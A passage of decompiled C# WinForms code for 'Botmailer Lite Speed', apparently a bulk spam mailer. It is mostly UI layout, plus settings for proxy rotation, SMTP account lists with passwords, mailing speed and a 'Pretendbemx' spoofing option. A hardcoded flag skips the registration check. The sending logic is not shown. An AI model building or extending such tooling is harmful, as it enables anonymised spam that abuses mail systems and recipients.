      Button checkProxy1 = this.CheckProxy;
      point1 = new Point(148, 42);
      Point point36 = point1;
      checkProxy1.Location = point36;
      this.CheckProxy.Name = "CheckProxy";
      Button checkProxy2 = this.CheckProxy;
      size1 = new Size(80, 22);
      Size size35 = size1;
      checkProxy2.Size = size35;
      this.CheckProxy.TabIndex = 3;
      this.CheckProxy.Text = "Check Proxy";
      this.Button11.BackColor = System.Drawing.Color.CornflowerBlue;
      this.Button11.FlatStyle = FlatStyle.Popup;
      Button button11_1 = this.Button11;
      point1 = new Point(17, 175);
      Point point37 = point1;
      button11_1.Location = point37;
      this.Button11.Name = "Button11";
      Button button11_2 = this.Button11;
      size1 = new Size(94, 35);
      Size size36 = size1;
      button11_2.Size = size36;
      this.Button11.TabIndex = 15;
      this.Button11.Text = "Open Checked Proxies";
      TextBox proxy1 = this.Proxy;
      point1 = new Point(104, 8);
      Point point38 = point1;
      proxy1.Location = point38;
      this.Proxy.Name = "Proxy";
      TextBox proxy2 = this.Proxy;
      size1 = new Size(122, 20);
      Size size37 = size1;
      proxy2.Size = size37;
      this.Proxy.TabIndex = 1;
      this.Proxy.Text = "";
      this.Message.BackColor = System.Drawing.Color.Transparent;
      this.Message.BorderStyle = BorderStyle.FixedSingle;
      this.Message.Controls.AddRange(new Control[17]
      {
        (Control) this.Label17,
        (Control) this.Button5,
        (Control) this.HTML,
        (Control) this.Button6,
        (Control) this.Subject,
        (Control) this.Label5,
        (Control) this.Label4,
        (Control) this.Label3,
        (Control) this.Fromname,
        (Control) this.Label2,
        (Control) this.Label1,
        (Control) this.Body,
        (Control) this.ToName,
        (Control) this.ReplyTo,
        (Control) this.From,
        (Control) this.Recipient,
        (Control) this.TrackBar2
      });
      Panel message1 = this.Message;
      point1 = new Point(48, 8);
      Point point39 = point1;
      message1.Location = point39;
      this.Message.Name = "Message";
      Panel message2 = this.Message;
      size1 = new Size(480, 272);
      Size size38 = size1;
      message2.Size = size38;
      this.Message.TabIndex = 2;
      Label label17_1 = this.Label17;
      point1 = new Point(376, 112);
      Point point40 = point1;
      label17_1.Location = point40;
      this.Label17.Name = "Label17";
      this.Label17.RightToLeft = RightToLeft.No;
      Label label17_2 = this.Label17;
      size1 = new Size(88, 16);
      Size size39 = size1;
      label17_2.Size = size39;
      this.Label17.TabIndex = 17;
      this.Label17.Text = "Mailing Speed";
      this.Button5.BackColor = System.Drawing.Color.Yellow;
      this.Button5.BackgroundImage = (Image) resourceManager.GetObject("Button5.BackgroundImage");
      this.Button5.FlatStyle = FlatStyle.Popup;
      Button button5_1 = this.Button5;
      point1 = new Point(360, 40);
      Point point41 = point1;
      button5_1.Location = point41;
      this.Button5.Name = "Button5";
      Button button5_2 = this.Button5;
      size1 = new Size(104, 24);
      Size size40 = size1;
      button5_2.Size = size40;
      this.Button5.TabIndex = 16;
      this.Button5.Text = "Stop";
      CheckBox html1 = this.HTML;
      point1 = new Point(312, 104);
      Point point42 = point1;
      html1.Location = point42;
      this.HTML.Name = "HTML";
      CheckBox html2 = this.HTML;
      size1 = new Size(56, 16);
      Size size41 = size1;
      html2.Size = size41;
      this.HTML.TabIndex = 15;
      this.HTML.Text = "HTML";
      this.Button6.BackColor = System.Drawing.Color.Yellow;
      this.Button6.BackgroundImage = (Image) resourceManager.GetObject("Button6.BackgroundImage");
      this.Button6.FlatStyle = FlatStyle.Popup;
      Button button6_1 = this.Button6;
      point1 = new Point(360, 8);
      Point point43 = point1;
      button6_1.Location = point43;
      this.Button6.Name = "Button6";
      Button button6_2 = this.Button6;
      size1 = new Size(104, 24);
      Size size42 = size1;
      button6_2.Size = size42;
      this.Button6.TabIndex = 13;
      this.Button6.Text = "Send";
      TextBox subject1 = this.Subject;
      point1 = new Point(32, 104);
      Point point44 = point1;
      subject1.Location = point44;
      this.Subject.Name = "Subject";
      TextBox subject2 = this.Subject;
      size1 = new Size(272, 20);
      Size size43 = size1;
      subject2.Size = size43;
      this.Subject.TabIndex = 11;
      this.Subject.Text = "";
      Label label5_1 = this.Label5;
      point1 = new Point(184, 72);
      Point point45 = point1;
      label5_1.Location = point45;
      this.Label5.Name = "Label5";
      Label label5_2 = this.Label5;
      size1 = new Size(40, 16);
      Size size44 = size1;
      label5_2.Size = size44;
      this.Label5.TabIndex = 10;
      this.Label5.Text = "Name";
      Label label4_1 = this.Label4;
      point1 = new Point(184, 40);
      Point point46 = point1;
      label4_1.Location = point46;
      this.Label4.Name = "Label4";
      Label label4_2 = this.Label4;
      size1 = new Size(40, 16);
      Size size45 = size1;
      label4_2.Size = size45;
      this.Label4.TabIndex = 9;
      this.Label4.Text = "Name:";
      Label label3_1 = this.Label3;
      point1 = new Point(104, 8);
      Point point47 = point1;
      label3_1.Location = point47;
      this.Label3.Name = "Label3";
      Label label3_2 = this.Label3;
      size1 = new Size(56, 16);
      Size size46 = size1;
      label3_2.Size = size46;
      this.Label3.TabIndex = 8;
      this.Label3.Text = "Reply-To:";
      this.Fromname.BorderStyle = BorderStyle.FixedSingle;
      TextBox fromname1 = this.Fromname;
      point1 = new Point(232, 72);
      Point point48 = point1;
      fromname1.Location = point48;
      this.Fromname.Name = "Fromname";
      TextBox fromname2 = this.Fromname;
      size1 = new Size(104, 20);
      Size size47 = size1;
      fromname2.Size = size47;
      this.Fromname.TabIndex = 7;
      this.Fromname.Text = "";
      Label label2_1 = this.Label2;
      point1 = new Point(16, 72);
      Point point49 = point1;
      label2_1.Location = point49;
      this.Label2.Name = "Label2";
      Label label2_2 = this.Label2;
      size1 = new Size(32, 16);
      Size size48 = size1;
      label2_2.Size = size48;
      this.Label2.TabIndex = 6;
      this.Label2.Text = "From:";
      Label label1_1 = this.Label1;
      point1 = new Point(24, 40);
      Point point50 = point1;
      label1_1.Location = point50;
      this.Label1.Name = "Label1";
      Label label1_2 = this.Label1;
      size1 = new Size(24, 16);
      Size size49 = size1;
      label1_2.Size = size49;
      this.Label1.TabIndex = 5;
      this.Label1.Text = "To:";
      this.Body.BorderStyle = BorderStyle.FixedSingle;
      RichTextBox body1 = this.Body;
      point1 = new Point(32, 128);
      Point point51 = point1;
      body1.Location = point51;
      this.Body.Name = "Body";
      RichTextBox body2 = this.Body;
      size1 = new Size(424, 120);
      Size size50 = size1;
      body2.Size = size50;
      this.Body.TabIndex = 4;
      this.Body.Text = "";
      this.ToName.BorderStyle = BorderStyle.FixedSingle;
      TextBox toName1 = this.ToName;
      point1 = new Point(232, 40);
      Point point52 = point1;
      toName1.Location = point52;
      this.ToName.Name = "ToName";
      TextBox toName2 = this.ToName;
      size1 = new Size(104, 20);
      Size size51 = size1;
      toName2.Size = size51;
      this.ToName.TabIndex = 3;
      this.ToName.Text = "";
      this.ReplyTo.BorderStyle = BorderStyle.FixedSingle;
      TextBox replyTo1 = this.ReplyTo;
      point1 = new Point(168, 8);
      Point point53 = point1;
      replyTo1.Location = point53;
      this.ReplyTo.Name = "ReplyTo";
      TextBox replyTo2 = this.ReplyTo;
      size1 = new Size(112, 20);
      Size size52 = size1;
      replyTo2.Size = size52;
      this.ReplyTo.TabIndex = 2;
      this.ReplyTo.Text = "";
      this.From.BorderStyle = BorderStyle.FixedSingle;
      TextBox from1 = this.From;
      point1 = new Point(56, 72);
      Point point54 = point1;
      from1.Location = point54;
      this.From.Name = "From";
      TextBox from2 = this.From;
      size1 = new Size(120, 20);
      Size size53 = size1;
      from2.Size = size53;
      this.From.TabIndex = 1;
      this.From.Text = "";
      this.Recipient.BorderStyle = BorderStyle.FixedSingle;
      TextBox recipient1 = this.Recipient;
      point1 = new Point(56, 40);
      Point point55 = point1;
      recipient1.Location = point55;
      this.Recipient.Name = "Recipient";
      TextBox recipient2 = this.Recipient;
      size1 = new Size(120, 20);
      Size size54 = size1;
      recipient2.Size = size54;
      this.Recipient.TabIndex = 0;
      this.Recipient.Text = "";
      this.TrackBar2.BackColor = System.Drawing.Color.LightSteelBlue;
      TrackBar trackBar2_1 = this.TrackBar2;
      point1 = new Point(368, 80);
      Point point56 = point1;
      trackBar2_1.Location = point56;
      this.TrackBar2.Maximum = 3;
      this.TrackBar2.Minimum = 1;
      this.TrackBar2.Name = "TrackBar2";
      TrackBar trackBar2_2 = this.TrackBar2;
      size1 = new Size(104, 45);
      Size size55 = size1;
      trackBar2_2.Size = size55;
      this.TrackBar2.TabIndex = 14;
      this.TrackBar2.Value = 1;
      this.SmtpAuth.BackColor = System.Drawing.Color.Transparent;
      this.SmtpAuth.BorderStyle = BorderStyle.FixedSingle;
      this.SmtpAuth.Controls.AddRange(new Control[20]
      {
        (Control) this.Label16,
        (Control) this.Button21,
        (Control) this.Button9,
        (Control) this.Addaccnt,
        (Control) this.SaveAccount,
        (Control) this.clear,
        (Control) this.OpenSmtp,
        (Control) this.HideSMTP,
        (Control) this.Label10,
        (Control) this.Label9,
        (Control) this.Label8,
        (Control) this.Label7,
        (Control) this.Label6,
        (Control) this.RealEmail,
        (Control) this.Accountlist,
        (Control) this.password,
        (Control) this.username,
        (Control) this.pop3,
        (Control) this.smtp,
        (Control) this.Proxy
      });
      Panel smtpAuth1 = this.SmtpAuth;
      point1 = new Point(136, 8);
      Point point57 = point1;
      smtpAuth1.Location = point57;
      this.SmtpAuth.Name = "SmtpAuth";
      Panel smtpAuth2 = this.SmtpAuth;
      size1 = new Size(312, 272);
      Size size56 = size1;
      smtpAuth2.Size = size56;
      this.SmtpAuth.TabIndex = 13;
      this.Label16.BorderStyle = BorderStyle.Fixed3D;
      Label label16_1 = this.Label16;
      point1 = new Point(24, 8);
      Point point58 = point1;
      label16_1.Location = point58;
      this.Label16.Name = "Label16";
      Label label16_2 = this.Label16;
      size1 = new Size(72, 16);
      Size size57 = size1;
      label16_2.Size = size57;
      this.Label16.TabIndex = 18;
      this.Label16.Text = "Proxy:Port";
      this.Button21.BackColor = SystemColors.InactiveCaption;
      this.Button21.FlatStyle = FlatStyle.Popup;
      Button button21_1 = this.Button21;
      point1 = new Point(120, 240);
      Point point59 = point1;
      button21_1.Location = point59;
      this.Button21.Name = "Button21";
      Button button21_2 = this.Button21;
      size1 = new Size(64, 24);
      Size size58 = size1;
      button21_2.Size = size58;
      this.Button21.TabIndex = 17;
      this.Button21.Text = "OK";
      this.Button9.BackColor = System.Drawing.Color.CornflowerBlue;
      this.Button9.FlatStyle = FlatStyle.Popup;
      Button button9_1 = this.Button9;
      point1 = new Point(24, 208);
      Point point60 = point1;
      button9_1.Location = point60;
      this.Button9.Name = "Button9";
      Button button9_2 = this.Button9;
      size1 = new Size(48, 24);
      Size size59 = size1;
      button9_2.Size = size59;
      this.Button9.TabIndex = 16;
      this.Button9.Text = "Clear";
      this.Addaccnt.BackColor = System.Drawing.Color.CornflowerBlue;
      this.Addaccnt.FlatStyle = FlatStyle.Popup;
      Button addaccnt1 = this.Addaccnt;
      point1 = new Point(264, 208);
      Point point61 = point1;
      addaccnt1.Location = point61;
      this.Addaccnt.Name = "Addaccnt";
      Button addaccnt2 = this.Addaccnt;
      size1 = new Size(40, 24);
      Size size60 = size1;
      addaccnt2.Size = size60;
      this.Addaccnt.TabIndex = 15;
      this.Addaccnt.Text = "Add";
      this.SaveAccount.BackColor = System.Drawing.Color.CornflowerBlue;
      this.SaveAccount.FlatStyle = FlatStyle.Popup;
      Button saveAccount1 = this.SaveAccount;
      point1 = new Point(168, 208);
      Point point62 = point1;
      saveAccount1.Location = point62;
      this.SaveAccount.Name = "SaveAccount";
      Button saveAccount2 = this.SaveAccount;
      size1 = new Size(48, 24);
      Size size61 = size1;
      saveAccount2.Size = size61;
      this.SaveAccount.TabIndex = 14;
      this.SaveAccount.Text = "Save";
      this.clear.BackColor = System.Drawing.Color.CornflowerBlue;
      this.clear.FlatStyle = FlatStyle.Popup;
      Button clear1 = this.clear;
      point1 = new Point(216, 208);
      Point point63 = point1;
      clear1.Location = point63;
      this.clear.Name = "clear";
      Button clear2 = this.clear;
      size1 = new Size(48, 24);
      Size size62 = size1;
      clear2.Size = size62;
      this.clear.TabIndex = 13;
      this.clear.Text = "Delete";
      this.OpenSmtp.BackColor = System.Drawing.Color.CornflowerBlue;
      this.OpenSmtp.FlatStyle = FlatStyle.Popup;
      Button openSmtp1 = this.OpenSmtp;
      point1 = new Point(120, 208);
      Point point64 = point1;
      openSmtp1.Location = point64;
      this.OpenSmtp.Name = "OpenSmtp";
      Button openSmtp2 = this.OpenSmtp;
      size1 = new Size(48, 24);
      Size size63 = size1;
      openSmtp2.Size = size63;
      this.OpenSmtp.TabIndex = 12;
      this.OpenSmtp.Text = "Open";
      this.HideSMTP.BackColor = System.Drawing.Color.CornflowerBlue;
      this.HideSMTP.FlatStyle = FlatStyle.Popup;
      Button hideSmtp1 = this.HideSMTP;
      point1 = new Point(72, 208);
      Point point65 = point1;
      hideSmtp1.Location = point65;
      this.HideSMTP.Name = "HideSMTP";
      Button hideSmtp2 = this.HideSMTP;
      size1 = new Size(48, 24);
      Size size64 = size1;
      hideSmtp2.Size = size64;
      this.HideSMTP.TabIndex = 11;
      this.HideSMTP.Text = "Hide";
      this.Label10.BorderStyle = BorderStyle.Fixed3D;
      Label label10_1 = this.Label10;
      point1 = new Point(168, 72);
      Point point66 = point1;
      label10_1.Location = point66;
      this.Label10.Name = "Label10";
      Label label10_2 = this.Label10;
      size1 = new Size(72, 16);
      Size size65 = size1;
      label10_2.Size = size65;
      this.Label10.TabIndex = 10;
      this.Label10.Text = "Password";
      this.Label9.BorderStyle = BorderStyle.Fixed3D;
      Label label9_1 = this.Label9;
      point1 = new Point(32, 72);
      Point point67 = point1;
      label9_1.Location = point67;
      this.Label9.Name = "Label9";
      Label label9_2 = this.Label9;
      size1 = new Size(72, 16);
      Size size66 = size1;
      label9_2.Size = size66;
      this.Label9.TabIndex = 9;
      this.Label9.Text = "Username";
      this.Label8.BorderStyle = BorderStyle.Fixed3D;
      Label label8_1 = this.Label8;
      point1 = new Point(168, 32);
      Point point68 = point1;
      label8_1.Location = point68;
      this.Label8.Name = "Label8";
      Label label8_2 = this.Label8;
      size1 = new Size(88, 16);
      Size size67 = size1;
      label8_2.Size = size67;
      this.Label8.TabIndex = 8;
      this.Label8.Text = "Pop3";
      this.Label7.BorderStyle = BorderStyle.Fixed3D;
      Label label7_1 = this.Label7;
      point1 = new Point(32, 32);
      Point point69 = point1;
      label7_1.Location = point69;
      this.Label7.Name = "Label7";
      Label label7_2 = this.Label7;
      size1 = new Size(100, 16);
      Size size68 = size1;
      label7_2.Size = size68;
      this.Label7.TabIndex = 7;
      this.Label7.Text = "Smtp";
      this.Label6.BorderStyle = BorderStyle.Fixed3D;
      Label label6_1 = this.Label6;
      point1 = new Point(40, 112);
      Point point70 = point1;
      label6_1.Location = point70;
      this.Label6.Name = "Label6";
      Label label6_2 = this.Label6;
      size1 = new Size(144, 23);
      Size size69 = size1;
      label6_2.Size = size69;
      this.Label6.TabIndex = 6;
      this.Label6.Text = "Account E-mail Address:";
      this.RealEmail.BorderStyle = BorderStyle.FixedSingle;
      TextBox realEmail1 = this.RealEmail;
      point1 = new Point(192, 112);
      Point point71 = point1;
      realEmail1.Location = point71;
      this.RealEmail.Name = "RealEmail";
      TextBox realEmail2 = this.RealEmail;
      size1 = new Size(104, 20);
      Size size70 = size1;
      realEmail2.Size = size70;
      this.RealEmail.TabIndex = 5;
      this.RealEmail.Text = "";
      this.Accountlist.BorderStyle = BorderStyle.FixedSingle;
      ListBox accountlist1 = this.Accountlist;
      point1 = new Point(40, 136);
      Point point72 = point1;
      accountlist1.Location = point72;
      this.Accountlist.Name = "Accountlist";
      ListBox accountlist2 = this.Accountlist;
      size1 = new Size(240, 67);
      Size size71 = size1;
      accountlist2.Size = size71;
      this.Accountlist.TabIndex = 4;
      this.password.BorderStyle = BorderStyle.FixedSingle;
      TextBox password1 = this.password;
      point1 = new Point(168, 88);
      Point point73 = point1;
      password1.Location = point73;
      this.password.Name = "password";
      this.password.PasswordChar = '*';
      TextBox password2 = this.password;
      size1 = new Size(120, 20);
      Size size72 = size1;
      password2.Size = size72;
      this.password.TabIndex = 3;
      this.password.Text = "";
      this.username.BorderStyle = BorderStyle.FixedSingle;
      TextBox username1 = this.username;
      point1 = new Point(32, 88);
      Point point74 = point1;
      username1.Location = point74;
      this.username.Name = "username";
      TextBox username2 = this.username;
      size1 = new Size(112, 20);
      Size size73 = size1;
      username2.Size = size73;
      this.username.TabIndex = 2;
      this.username.Text = "";
      this.pop3.BorderStyle = BorderStyle.FixedSingle;
      TextBox pop3_1 = this.pop3;
      point1 = new Point(168, 48);
      Point point75 = point1;
      pop3_1.Location = point75;
      this.pop3.Name = "pop3";
      TextBox pop3_2 = this.pop3;
      size1 = new Size(120, 20);
      Size size74 = size1;
      pop3_2.Size = size74;
      this.pop3.TabIndex = 1;
      this.pop3.Text = "";
      this.smtp.BorderStyle = BorderStyle.FixedSingle;
      TextBox smtp1 = this.smtp;
      point1 = new Point(32, 48);
      Point point76 = point1;
      smtp1.Location = point76;
      this.smtp.Name = "smtp";
      TextBox smtp2 = this.smtp;
      size1 = new Size(112, 20);
      Size size75 = size1;
      smtp2.Size = size75;
      this.smtp.TabIndex = 0;
      this.smtp.Text = "";
      this.SaveFileDialog1.FileName = "doc1";
      this.MailingList.BackColor = System.Drawing.Color.Transparent;
      this.MailingList.BorderStyle = BorderStyle.FixedSingle;
      this.MailingList.Controls.AddRange(new Control[6]
      {
        (Control) this.Stopchecking,
        (Control) this.Button4,
        (Control) this.Button3,
        (Control) this.Button2,
        (Control) this.ListBox1,
        (Control) this.Button1
      });
      Panel mailingList1 = this.MailingList;
      point1 = new Point(144, 40);
      Point point77 = point1;
      mailingList1.Location = point77;
      this.MailingList.Name = "MailingList";
      Panel mailingList2 = this.MailingList;
      size1 = new Size(392, 200);
      Size size76 = size1;
      mailingList2.Size = size76;
      this.MailingList.TabIndex = 15;
      this.MailingList.Visible = false;
      CheckBox stopchecking1 = this.Stopchecking;
      point1 = new Point(8, 112);
      Point point78 = point1;
      stopchecking1.Location = point78;
      this.Stopchecking.Name = "Stopchecking";
      CheckBox stopchecking2 = this.Stopchecking;
      size1 = new Size(16, 16);
      Size size77 = size1;
      stopchecking2.Size = size77;
      this.Stopchecking.TabIndex = 5;
      this.Stopchecking.Text = "CheckBox1";
      this.Stopchecking.Visible = false;
      this.Button4.BackColor = System.Drawing.Color.CornflowerBlue;
      this.Button4.FlatStyle = FlatStyle.Popup;
      Button button4 = this.Button4;
      point1 = new Point(104, 168);
      Point point79 = point1;
      button4.Location = point79;
      this.Button4.Name = "Button4";
      this.Button4.TabIndex = 4;
      this.Button4.Text = "Save";
      this.Button3.BackColor = System.Drawing.Color.CornflowerBlue;
      this.Button3.FlatStyle = FlatStyle.Popup;
      Button button3_1 = this.Button3;
      point1 = new Point(8, 168);
      Point point80 = point1;
      button3_1.Location = point80;
      this.Button3.Name = "Button3";
      Button button3_2 = this.Button3;
      size1 = new Size(80, 24);
      Size size78 = size1;
      button3_2.Size = size78;
      this.Button3.TabIndex = 3;
      this.Button3.Text = "Clear";
      this.Button2.BackColor = System.Drawing.Color.CornflowerBlue;
      this.Button2.FlatStyle = FlatStyle.Popup;
      Button button2_1 = this.Button2;
      point1 = new Point(200, 168);
      Point point81 = point1;
      button2_1.Location = point81;
      this.Button2.Name = "Button2";
      Button button2_2 = this.Button2;
      size1 = new Size(80, 24);
      Size size79 = size1;
      button2_2.Size = size79;
      this.Button2.TabIndex = 2;
      this.Button2.Text = "Open";
      ListBox listBox1_1 = this.ListBox1;
      point1 = new Point(48, 16);
      Point point82 = point1;
      listBox1_1.Location = point82;
      this.ListBox1.Name = "ListBox1";
      ListBox listBox1_2 = this.ListBox1;
      size1 = new Size(328, 134);
      Size size80 = size1;
      listBox1_2.Size = size80;
      this.ListBox1.TabIndex = 1;
      this.Button1.BackColor = System.Drawing.Color.CornflowerBlue;
      this.Button1.FlatStyle = FlatStyle.Popup;
      Button button1_1 = this.Button1;
      point1 = new Point(304, 168);
      Point point83 = point1;
      button1_1.Location = point83;
      this.Button1.Name = "Button1";
      Button button1_2 = this.Button1;
      size1 = new Size(80, 24);
      Size size81 = size1;
      button1_2.Size = size81;
      this.Button1.TabIndex = 0;
      this.Button1.Text = "Hide";
      this.Panel3.BackColor = System.Drawing.Color.Transparent;
      this.Panel3.BorderStyle = BorderStyle.FixedSingle;
      this.Panel3.Controls.AddRange(new Control[2]
      {
        (Control) this.Button12,
        (Control) this.Listlog
      });
      Panel panel3_1 = this.Panel3;
      point1 = new Point(16, 48);
      Point point84 = point1;
      panel3_1.Location = point84;
      this.Panel3.Name = "Panel3";
      Panel panel3_2 = this.Panel3;
      size1 = new Size(552, 200);
      Size size82 = size1;
      panel3_2.Size = size82;
      this.Panel3.TabIndex = 18;
      this.Panel3.Visible = false;
      this.Button12.BackColor = System.Drawing.Color.CornflowerBlue;
      this.Button12.FlatStyle = FlatStyle.Popup;
      Button button12_1 = this.Button12;
      point1 = new Point(232, 160);
      Point point85 = point1;
      button12_1.Location = point85;
      this.Button12.Name = "Button12";
      Button button12_2 = this.Button12;
      size1 = new Size(104, 24);
      Size size83 = size1;
      button12_2.Size = size83;
      this.Button12.TabIndex = 18;
      this.Button12.Text = "Hide";
      this.Listlog.HorizontalScrollbar = true;
      ListBox listlog1 = this.Listlog;
      point1 = new Point(16, 8);
      Point point86 = point1;
      listlog1.Location = point86;
      this.Listlog.Name = "Listlog";
      this.Listlog.ScrollAlwaysVisible = true;
      ListBox listlog2 = this.Listlog;
      size1 = new Size(528, 134);
      Size size84 = size1;
      listlog2.Size = size84;
      this.Listlog.TabIndex = 17;
      this.log.BackColor = System.Drawing.Color.White;
      this.log.BorderStyle = BorderStyle.FixedSingle;
      this.log.LinkColor = System.Drawing.Color.RoyalBlue;
      LinkLabel log1 = this.log;
      point1 = new Point(16, 288);
      Point point87 = point1;
      log1.Location = point87;
      this.log.Name = "log";
      LinkLabel log2 = this.log;
      size1 = new Size(88, 16);
      Size size85 = size1;
      log2.Size = size85;
      this.log.TabIndex = 19;
      ((Label) this.log).TabStop = true;
      this.log.Text = "Log";
      this.Label13.BackColor = System.Drawing.Color.White;
      this.Label13.BorderStyle = BorderStyle.FixedSingle;
      this.Label13.ForeColor = System.Drawing.Color.DodgerBlue;
      Label label13_1 = this.Label13;
      point1 = new Point(360, 288);
      Point point88 = point1;
      label13_1.Location = point88;
      this.Label13.Name = "Label13";
      Label label13_2 = this.Label13;
      size1 = new Size(88, 16);
      Size size86 = size1;
      label13_2.Size = size86;
      this.Label13.TabIndex = 20;
      this.Label13.Text = "Messages Sent:";
      this.Label14.BackColor = System.Drawing.Color.White;
      this.Label14.BorderStyle = BorderStyle.FixedSingle;
      Label label14_1 = this.Label14;
      point1 = new Point(456, 288);
      Point point89 = point1;
      label14_1.Location = point89;
      this.Label14.Name = "Label14";
      Label label14_2 = this.Label14;
      size1 = new Size(48, 16);
      Size size87 = size1;
      label14_2.Size = size87;
      this.Label14.TabIndex = 21;
      this.Label14.Text = "0";
      this.Status.BackColor = System.Drawing.Color.Transparent;
      this.Status.ForeColor = System.Drawing.Color.Black;
      Label status1 = this.Status;
      point1 = new Point(152, 288);
      Point point90 = point1;
      status1.Location = point90;
      this.Status.Name = "Status";
      Label status2 = this.Status;
      size1 = new Size(112, 16);
      Size size88 = size1;
      status2.Size = size88;
      this.Status.TabIndex = 22;
      size1 = new Size(5, 13);
      this.AutoScaleBaseSize = size1;
      this.BackgroundImage = (Image) resourceManager.GetObject("$this.BackgroundImage");
      size1 = new Size(584, 305);
      this.ClientSize = size1;
      this.Controls.AddRange(new Control[10]
      {
        (Control) this.SmtpAuth,
        (Control) this.MailingList,
        (Control) this.Panel2,
        (Control) this.Panel1,
        (Control) this.Status,
        (Control) this.log,
        (Control) this.Label13,
        (Control) this.Label14,
        (Control) this.Panel3,
        (Control) this.Message
      });
      this.FormBorderStyle = FormBorderStyle.FixedSingle;
      this.Icon = (Icon) resourceManager.GetObject("$this.Icon");
      this.MaximizeBox = false;
      this.Menu = this.MainMenu1;
      this.Name = nameof (Form1);
      this.Text = "Botmailer Lite Speed";
      this.Panel1.ResumeLayout(false);
      this.Panel2.ResumeLayout(false);
      this.Panel4.ResumeLayout(false);
      this.ProxyGroup.ResumeLayout(false);
      this.TrackBar1.EndInit();
      this.Message.ResumeLayout(false);
      this.TrackBar2.EndInit();
      this.SmtpAuth.ResumeLayout(false);
      this.MailingList.ResumeLayout(false);
      this.Panel3.ResumeLayout(false);
      this.ResumeLayout(false);
    }

    private void MenuItem16_Click(object sender, EventArgs e) => this.Panel1.Show();

    private void CloseAbout_Click(object sender, EventArgs e) => this.Panel1.Hide();

    private void HideProxy_Click(object sender, EventArgs e) => this.Panel2.Hide();

    private void MenuItem18_Click(object sender, EventArgs e)
    {
      this.Panel2.Visible = false;
      this.MailingList.Hide();
      this.SmtpAuth.Visible = false;
    }

    private void Button1_Click(object sender, EventArgs e) => this.Message.Hide();

    private void Form1_Load(object sender, EventArgs e)
    {
      string str1 = DateTime.Today.Day.ToString();
      string setting1 = Interaction.GetSetting("lingobingo", "start up", "Default", "1");
      string setting2 = Interaction.GetSetting("lingobingo", "start up", "Default2", "1");
      if (DoubleType.FromString(setting2) < 0.0)
      {
        int num = (int) Interaction.MsgBox((object) "Sorry, this program is uncrackable.");
        Application.Exit();
      }
      if (DoubleType.FromString(setting2) > 7.0)
      {
        int num = (int) Interaction.MsgBox((object) "Evaluation time over. Please buy the program at http://botmailer.invisible.at or http://botmailer.beware.us");
        Application.Exit();
      }
      else if (StringType.StrCmp(setting1, str1, false) != 0)
      {
        string Setting = StringType.FromDouble(DoubleType.FromString(setting2) + 1.0);
        Interaction.SaveSetting("lingobingo", "start up", "Default", str1);
        Interaction.SaveSetting("lingobingo", "start up", "Default2", Setting);
      }
      object current = (object) Cursor.Current;
      Cursor.Current = Cursors.WaitCursor;
      try
      {
        this.Recipient.Text = Interaction.GetSetting("Quasar", "start up", "RECIPIENT", "To");
        this.From.Text = Interaction.GetSetting("Quasar", "start up", "from", "from");
        this.Subject.Text = Interaction.GetSetting("Quasar", "start up", "Subject", "Subject");
        this.Body.Text = Interaction.GetSetting("Quasar", "start up", "BODY", "body");
        this.username.Text = Interaction.GetSetting("Quasar", "start up", "username", "username");
        this.password.Text = Interaction.GetSetting("Quasar", "start up", "password", "password");
        this.smtp.Text = Interaction.GetSetting("Quasar", "start up", "smtp", "smtp");
        this.pop3.Text = Interaction.GetSetting("Quasar", "start up", "pop3", "pop3");
        this.Proxy.Text = Interaction.GetSetting("Quasar", "start up", "Proxy", "Proxy:port");
        this.RealEmail.Text = Interaction.GetSetting("Quasar", "start up", "RealEmail");
        this.ReplyTo.Text = Interaction.GetSetting("Quasar", "start up", "Reply");
        this.ToName.Text = Interaction.GetSetting("Quasar", "start up", "ToName");
        this.Fromname.Text = Interaction.GetSetting("Quasar", "start up", "Fromname");
        this.Sylonious = Interaction.GetSetting("Quasar", "start up", "Sylonious");
        this.Useaccount = Interaction.GetSetting("Quasar", "start up", "Useaccount");
        this.UsePop = Interaction.GetSetting("Quasar", "start up", "UsePop");
        this.UseBuiltinSMTP = Interaction.GetSetting("Quasar", "start up", "Builtin");
        this.Pretendbemx = Interaction.GetSetting("Quasar", "start up", "Pretendbemx");
        this.RandomProxies = Interaction.GetSetting("Quasar", "start up", "RandomProxies");
        this.Htmlcheck = Interaction.GetSetting("Quasar", "start up", "Htmlcheck");
        Interaction.GetSetting("Quasar", "start up", "RealMailFrom");
        Interaction.GetSetting("Quasar", "start up", "bypass");
        this.Sylonious = "Yes";
        if (StringType.StrCmp(this.Sylonious, "Yes", false) == 0)
        {
          this.Button10.Hide();
          this.textbox1111.Hide();
          this.Label21.Hide();
        }
        else
        {
          int num = (int) Interaction.MsgBox((object) "Go To About and put in the registration code");
        }
        try
        {
          StreamReader streamReader = new StreamReader("Proxylist.txt");
          for (string str2 = streamReader.ReadLine(); str2 != null; str2 = streamReader.ReadLine())
          {
            string str3 = str2.Trim();
            if (str3.Length > 0)
              this.Proxylist2.Items.Add((object) str3);
          }
          this.Proxylist2.SelectedIndex = 0;
          streamReader.Close();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          StreamReader streamReader = new StreamReader("Accountlist.txt");
          for (string str4 = streamReader.ReadLine(); str4 != null; str4 = streamReader.ReadLine())
          {
            string str5 = str4.Trim();
            if (str5.Length > 0)
              this.Accountlist.Items.Add((object) str5);
          }
          this.Accountlist.SelectedIndex = 0;
          streamReader.Close();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (!(this.Accountlist.Items.Count != 0 & StringType.StrCmp(this.smtp.Text, (string) null, false) == 0))
        return;
      string[] strArray = StringType.FromObject(this.Accountlist.SelectedItem).Split(' ');
      this.smtp.Text = strArray[0];
      this.pop3.Text = strArray[1];
      this.username.Text = strArray[2];
      this.password.Text = strArray[3];
      this.RealEmail.Text = strArray[4];
    }

    private void MenuItem22_Click(object sender, EventArgs e)
    {
      this.SmtpAuth.Show();
      this.Panel2.Visible = false;
      this.MailingList.Hide();
    }

    private void HideSMTP_Click(object sender, EventArgs e) => this.SmtpAuth.Hide();

    private void MenuItem21_Click(object sender, EventArgs e)
    {
      this.Panel2.Visible = true;
      this.MailingList.Hide();
      this.SmtpAuth.Visible = false;
    }

    private void Accountlist_SelectedIndexChanged(object sender, EventArgs e)
    {
      string[] strArray = StringType.FromObject(this.Accountlist.SelectedItem).Split(' ');
      this.smtp.Text = strArray[0];
      this.pop3.Text = strArray[1];
      this.username.Text = strArray[2];
